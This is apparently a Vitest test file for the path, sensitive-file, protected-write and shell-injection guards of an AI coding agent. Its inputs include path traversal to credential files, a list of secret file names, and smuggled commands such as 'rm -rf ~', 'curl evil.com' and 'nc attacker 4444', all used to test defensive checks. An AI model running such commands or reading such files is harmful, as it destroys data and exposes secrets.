import { describe, it, expect } from 'vitest';
import {
  validateFilePath,
  isSensitiveFile,
  isProtectedWritePath,
  shellQuote,
  hasShellMetachar,
} from './tools/shared.js';

describe('validateFilePath', () => {
  it('accepts valid relative paths', () => {
    expect(validateFilePath('src/index.ts')).toBeNull();
    expect(validateFilePath('README.md')).toBeNull();
    expect(validateFilePath('deeply/nested/dir/file.js')).toBeNull();
  });

  it('rejects empty paths', () => {
    expect(validateFilePath('')).toContain('empty');
    expect(validateFilePath('   ')).toContain('empty');
  });

  it('rejects path traversal', () => {
    expect(validateFilePath('../etc/passwd')).toContain('traversal');
    expect(validateFilePath('../../.ssh/id_rsa')).toContain('traversal');
    expect(validateFilePath('src/../../../secret')).toContain('traversal');
  });

  it('rejects absolute paths', () => {
    expect(validateFilePath('/etc/passwd')).toContain('absolute');
    expect(validateFilePath('/home/user/.ssh/id_rsa')).toContain('absolute');
  });

  it('rejects paths with control characters', () => {
    expect(validateFilePath('file\x00name.ts')).toContain('invalid characters');
    expect(validateFilePath('file`name.ts')).toContain('invalid characters');
  });

  it('rejects excessively long paths', () => {
    const longPath = 'a'.repeat(81);
    expect(validateFilePath(longPath)).toContain('too long');
  });

  it('rejects long path segments', () => {
    const longSegment = 'a'.repeat(61);
    expect(validateFilePath(`src/${longSegment}/file.ts`)).toContain('segment too long');
  });
});

describe('isSensitiveFile', () => {
  it('blocks env files', () => {
    expect(isSensitiveFile('.env')).toBe(true);
    expect(isSensitiveFile('.env.local')).toBe(true);
    expect(isSensitiveFile('.env.production')).toBe(true);
  });

  it('blocks crypto files', () => {
    expect(isSensitiveFile('private.key')).toBe(true);
    expect(isSensitiveFile('cert.pem')).toBe(true);
    expect(isSensitiveFile('keystore.p12')).toBe(true);
    expect(isSensitiveFile('cert.pfx')).toBe(true);
  });

  it('blocks SSH keys', () => {
    expect(isSensitiveFile('id_rsa')).toBe(true);
    expect(isSensitiveFile('id_ed25519')).toBe(true);
  });

  it('blocks credential files', () => {
    expect(isSensitiveFile('credentials.json')).toBe(true);
    expect(isSensitiveFile('secrets.json')).toBe(true);
    expect(isSensitiveFile('secrets.yaml')).toBe(true);
    expect(isSensitiveFile('token.json')).toBe(true);
  });

  it('allows normal files', () => {
    expect(isSensitiveFile('index.ts')).toBe(false);
    expect(isSensitiveFile('package.json')).toBe(false);
    expect(isSensitiveFile('utils/helpers.py')).toBe(false);
  });

  it('checks basename not full path', () => {
    expect(isSensitiveFile('config/.env')).toBe(true);
    expect(isSensitiveFile('deeply/nested/.env.local')).toBe(true);
  });
});

describe('isProtectedWritePath', () => {
  it('blocks writes under .sidecar/logs (repudiation)', () => {
    expect(isProtectedWritePath('.sidecar/logs/audit.jsonl')).not.toBeNull();
    expect(isProtectedWritePath('.sidecar/logs/nested/file.log')).not.toBeNull();
  });
  it('blocks writes under .sidecar/memory (poisoning)', () => {
    expect(isProtectedWritePath('.sidecar/memory/agent-memories.json')).not.toBeNull();
  });
  it('blocks writes under .sidecar/sessions and .sidecar/cache', () => {
    expect(isProtectedWritePath('.sidecar/sessions/last.json')).not.toBeNull();
    expect(isProtectedWritePath('.sidecar/cache/embeddings.bin')).not.toBeNull();
  });
  it('blocks writes to .sidecar/settings.json specifically', () => {
    expect(isProtectedWritePath('.sidecar/settings.json')).not.toBeNull();
  });
  it('allows writes to human-editable .sidecar working areas', () => {
    expect(isProtectedWritePath('.sidecar/SIDECAR.md')).toBeNull();
    expect(isProtectedWritePath('.sidecar/plans/my-plan.md')).toBeNull();
    expect(isProtectedWritePath('.sidecar/specs/my-spec.md')).toBeNull();
    expect(isProtectedWritePath('.sidecar/scratchpad/notes.md')).toBeNull();
  });
  it('allows normal workspace writes', () => {
    expect(isProtectedWritePath('src/foo.ts')).toBeNull();
    expect(isProtectedWritePath('README.md')).toBeNull();
  });
  it('handles Windows-style separators', () => {
    expect(isProtectedWritePath('.sidecar\\logs\\audit.jsonl')).not.toBeNull();
  });
  it('handles ./-prefixed paths', () => {
    expect(isProtectedWritePath('./.sidecar/logs/audit.jsonl')).not.toBeNull();
  });
});

describe('shellQuote', () => {
  it('wraps simple values in single quotes', () => {
    expect(shellQuote('foo.test.ts')).toBe("'foo.test.ts'");
  });
  it('escapes embedded single quotes so the quoting stays balanced', () => {
    expect(shellQuote("foo's test.ts")).toBe("'foo'\\''s test.ts'");
  });
  it('safely handles spaces inside the path', () => {
    expect(shellQuote('some file.ts')).toBe("'some file.ts'");
  });
});

describe('hasShellMetachar (run_tests injection guard)', () => {
  it('accepts plain relative paths', () => {
    expect(hasShellMetachar('src/foo.test.ts')).toBe(false);
    expect(hasShellMetachar('tests/unit/module.spec.ts')).toBe(false);
    expect(hasShellMetachar('a-b_c.test.js')).toBe(false);
  });
  it('rejects command-chaining metacharacters', () => {
    expect(hasShellMetachar('foo.test.ts; rm -rf ~')).toBe(true);
    expect(hasShellMetachar('foo.test.ts && curl evil.com')).toBe(true);
    expect(hasShellMetachar('foo.test.ts | nc attacker 4444')).toBe(true);
  });
  it('rejects substitution metacharacters', () => {
    expect(hasShellMetachar('foo$(whoami).ts')).toBe(true);
    expect(hasShellMetachar('foo`id`.ts')).toBe(true);
  });
  it('rejects redirection metacharacters', () => {
    expect(hasShellMetachar('foo > /tmp/pwn')).toBe(true);
    expect(hasShellMetachar('foo < /etc/passwd')).toBe(true);
  });
  it('rejects glob / quote / escape metacharacters', () => {
    expect(hasShellMetachar('*.ts')).toBe(true);
    expect(hasShellMetachar('foo?.ts')).toBe(true);
    expect(hasShellMetachar("foo's")).toBe(true);
    expect(hasShellMetachar('foo"bar')).toBe(true);
    expect(hasShellMetachar('foo\\bar')).toBe(true);
  });
  it('rejects newline-based injection', () => {
    expect(hasShellMetachar('foo\nrm -rf ~')).toBe(true);
  });
});
